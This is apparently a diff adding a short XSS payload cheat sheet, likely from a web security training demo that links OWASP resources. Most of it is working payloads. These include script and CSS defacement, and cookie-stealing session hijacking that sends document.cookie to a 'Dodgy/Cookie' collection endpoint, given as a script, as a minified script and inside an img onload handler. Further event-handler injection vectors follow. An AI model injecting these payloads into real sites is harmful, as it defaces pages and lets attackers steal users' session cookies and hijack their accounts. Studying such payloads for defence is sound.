@@ -1,0 +1,52 @@
+﻿
+// 
+
+// Website Defacing
+<script>
+var rootElement = document.getElementById("main-home-content");
+rootElement.innerHTML = "<h1>Welcome to Paradise!</h1><img src=\"images/cheers.jpg\" />";
+</script>
+
+// Or minified
+<script>
+var rootElement=document.getElementById("main-home-content");rootElement.innerHTML='<h1>Welcome to Paradise!</h1><img src="images/cheers.jpg" />';
+</script>
+
+//----------------------------------------------------------------------------------------
+// Website Defacing with CSS
+<style>
+body {
+background-color: red;
+}
+</style>
+
+//----------------------------------------------------------------------------------------
+// Session Hijacking
+<script>
+    //var userPassword = prompt("Please sign in by entering your password");
+    console.log(document.cookie);
+    //document.location = "http://localhost:55057/Dodgy/Cookie?cookie=" + document.cookie;
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "http://localhost:55057/Dodgy/Cookie?cookie=" + document.cookie, true);
+    xhttp.send();
+</script>
+
+// Or minified
+<script>
+var xhttp=new XMLHttpRequest;xhttp.open("GET","http://localhost:55057/Dodgy/Cookie?cookie="+document.cookie,!0),xhttp.send();
+</script>
+
+// Challenge
+//----------------------------------------------------------------------------------------
+// Using images or any other HTML element that supports onload
+<script>alert("Hello');</script>
+<img src="images/cheers.jpg" onload="var xhttp=new XMLHttpRequest;xhttp.open('GET','http://localhost:55057/Dodgy/Cookie?cookie='+document.cookie,!0),xhttp.send();" alt="image" />
+
+<img src="javascript:alert(1)" />
+<b onmouseover="alert('Hello')">Bold Text</b>
+<img src="http://i.do.not.exist" onerror="" />
+
+Resources
+https://www.troyhunt.com/owasp-top-10-for-net-developers-part-2/
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
